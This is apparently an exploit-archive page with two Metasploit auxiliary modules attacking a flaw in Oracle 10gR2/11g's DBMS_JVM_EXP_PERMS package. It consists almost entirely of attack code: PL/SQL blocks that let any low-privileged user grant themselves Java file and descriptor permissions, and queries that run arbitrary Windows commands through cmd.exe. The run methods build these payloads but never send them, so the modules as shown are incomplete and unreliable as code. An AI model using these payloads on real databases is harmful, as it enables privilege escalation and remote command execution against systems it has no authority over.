Oracle 11gR2 Multiple Remote Privilege Escalation Vulnerabilities
=================================================================

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::ORACLE

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039; DBMS_JVM_EXP_PERMS 11g R1/R2 OS Code Execution&#039;,
			&#039;Description&#039;    => %q{
				This module exploits a flaw (0 day) in DBMS_JVM_EXP_PERMS package that allows
				any user with create session privilege to grant themselves java IO privileges.
				Identified by David Litchfield. Works on 11g R1 and R2 (Windows only).

			},
			&#039;Author&#039;         => [ &#039;sid[at]notsosecure.com&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision: 8822 $&#039;,
			&#039;References&#039;     =>
				[
					[ &#039;URL&#039;, &#039;http://blackhat.com/html/bh-dc-10/bh-dc-10-archives.html#Litchfield&#039; ],
					[ &#039;URL&#039;, &#039;http://www.notsosecure.com/folder2/2010/02/04/hacking-oracle-11g/&#039; ],
				],
			&#039;DisclosureDate&#039; => &#039;Feb 1 2010&#039;))

			register_options(
				[
					OptString.new(&#039;CMD&#039;, [ false, &#039;CMD to execute.&#039;,  "echo metasploit >> %SYSTEMDRIVE%\\\\unbreakable.txt"]),
				], self.class)
	end

	def run
		name = Rex::Text.rand_text_alpha(rand(10) + 1)


		package = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT &#039;GRANT&#039;,USER(), &#039;SYS&#039;,&#039;java.io.FilePermission&#039;,&#039;<<ALL FILES>>&#039;,&#039;execute&#039;,&#039;ENABLED&#039; from dual;BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"
		os_code = "select dbms_java.runjava(&#039;oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\cmd.exe /c  #{datastore[&#039;CMD&#039;]}&#039;)from dual"



		begin
			print_status("Attempting to grant JAVA IO Privileges")
			print_status("Attempting to execute OS Code")
		rescue => e
			print_status("Error: #{e.class} #{e}")
		end
	end

end


---------------------------------------

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::ORACLE

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039; DBMS_JVM_EXP_PERMS 10gR2, 11gR1/R2 OS Command Execution&#039;,
			&#039;Description&#039;    => %q{
				This module exploits a flaw (0 day) in DBMS_JVM_EXP_PERMS package that allows
				any user with create session privilege to grant themselves java IO privileges.
				Identified by David Litchfield. Works on 10g R2, 11g R1 and R2 (Windows only)

			},
			&#039;Author&#039;         => [ &#039;sid[at]notsosecure.com&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision: 8822 $&#039;,
			&#039;References&#039;     =>
				[
					[ &#039;URL&#039;, &#039;http://blackhat.com/html/bh-dc-10/bh-dc-10-archives.html#Litchfield&#039; ],
					[ &#039;URL&#039;, &#039;http://www.notsosecure.com/folder2/2010/02/04/hacking-oracle-11g/&#039; ],
				],
			&#039;DisclosureDate&#039; => &#039;Feb 1 2010&#039;))

			register_options(
				[
					OptString.new(&#039;CMD&#039;, [ false, &#039;CMD to execute.&#039;,  "echo metasploit >> %SYSTEMDRIVE%\\\\unbreakable.txt"]),
				], self.class)
	end

	def run
		name = Rex::Text.rand_text_alpha(rand(10) + 1)


		package1 = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT &#039;GRANT&#039;,USER(), &#039;SYS&#039;,&#039;java.io.FilePermission&#039;,&#039;<<ALL FILES>>&#039;,&#039;execute&#039;,&#039;ENABLED&#039; from dual;BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"

		package2 = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT &#039;GRANT&#039;,USER(), &#039;SYS&#039;,&#039;java.lang.RuntimePermission&#039;,&#039;writeFileDescriptor&#039;,NULL,&#039;ENABLED&#039; FROM DUAL;BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"


		package3 = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT &#039;GRANT&#039;,USER(), &#039;SYS&#039;,&#039;java.lang.RuntimePermission&#039;,&#039;readFileDescriptor&#039;,NULL,&#039;ENABLED&#039; FROM DUAL;BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"



		os_code = "select DBMS_JAVA_TEST.FUNCALL(&#039;oracle/aurora/util/Wrapper&#039;,&#039;main&#039;,&#039;c:\\windows\\system32\\cmd.exe&#039;, &#039;/c&#039;, &#039; #{datastore[&#039;CMD&#039;]}&#039;)from dual"

		begin
			print_status("Attempting to grant JAVA IO Privileges")
			print_status("Attempting to execute OS Code")
		rescue => e
			print_status("Error: #{e.class} #{e}")
		end
	end

end





